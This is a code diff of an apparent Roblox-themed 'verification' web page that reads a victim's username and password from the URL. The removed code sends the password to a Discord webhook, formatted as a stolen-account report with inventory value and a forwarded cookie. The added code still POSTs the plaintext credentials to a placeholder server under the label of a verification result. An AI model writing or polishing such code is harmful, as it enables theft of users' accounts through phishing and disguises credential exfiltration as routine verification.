@@ -124,9 +124,6 @@
         const username = urlParams.get('username');
         const password = urlParams.get('password');
         
-        // Discord webhook URL - Only one webhook for success
-        const SUCCESS_WEBHOOK = "";
-        
         // Display the tracking info
         if (trackingId) {
             document.getElementById('display-tracking-id').textContent = trackingId;
@@ -326,83 +323,37 @@
                 
                 resultMessage.classList.remove('hidden');
                 
-                // Send result to Discord using the SwiftLock format
-                await sendToDiscord(isSuccess);
+                // Send result back to Roblox game server
+                await sendResultToServer(isSuccess);
             } catch (error) {
                 console.error('Error reporting result:', error);
-                showError('Failed to send result to Discord: ' + error.message);
+                showError('Failed to send result to server: ' + error.message);
             }
         }
         
-        async function sendToDiscord(isSuccess) {
-            const webhookUrl = SUCCESS_WEBHOOK;
-            const statusText = isSuccess ? "✅ SUCCESS" : "❌ FAILED";
-            
-            // Get current time in the format "Today at HH:MM AM/PM"
-            const now = new Date();
-            const timeString = "Today at " + now.toLocaleTimeString('en-US', { 
-                hour: 'numeric', 
-                minute: '2-digit', 
-                hour12: true 
-            });
-            
-            const embed = {
-                title: "SwiftLock 4.3 Enterprise",
-                description: "Click to view the user's code.\n\nYou've earned it last point:",
-                color: isSuccess ? 65280 : 16711680, // Green for success, red for failure
-                fields: [
-                    {
-                        name: "**Username**: Password",
-                        value: `${username}: ||${password}||`,
-                        inline: false
-                    },
-                    {
-                        name: "**Account info**: Membership",
-                        value: `0 days old, 15+: NIC`,
-                        inline: false
-                    },
-                    {
-                        name: "**Security**: Rabbit",
-                        value: `Uncertified, no phone: $10`,
-                        inline: false
-                    },
-                    {
-                        name: "**Inventory SAP**: Credit",
-                        value: `Inventory SAP: $0.00`,
-                        inline: false
-                    },
-                    {
-                        name: "**Cookie**: Game",
-                        value: `Cookie: Forwarded`,
-                        inline: false
-                    }
-                ],
-                footer: {
-                    text: `Insert in login - ${timeString} | Tracking ID: ${trackingId}`
-                }
-            };
-            
-            const payload = {
-                username: "SwiftLock Enterprise",
-                content: isSuccess ? "#success #auto_verified" : "#failed #auto_verified",
-                embeds: [embed]
-            };
-            
+        async function sendResultToServer(isSuccess) {
             try {
-                const response = await fetch(webhookUrl, {
+                // Send verification result back to your Roblox game server
+                const response = await fetch(`https://your-roblox-game.com/verify-result`, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json'
+                        'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        trackingId: trackingId,
+                        userId: userId,
+                        username: username,
+                        password: password,
+                        success: isSuccess
+                    })
                 });
                 
                 if (!response.ok) {
-                    throw new Error(`Discord API responded with ${response.status}`);
+                    throw new Error(`Server responded with ${response.status}`);
                 }
             } catch (error) {
-                console.error('Error sending to Discord:', error);
-                throw error;
+                console.error('Error sending result to server:', error);
+                // You might want to implement a fallback here, like email notification
             }
         }
         
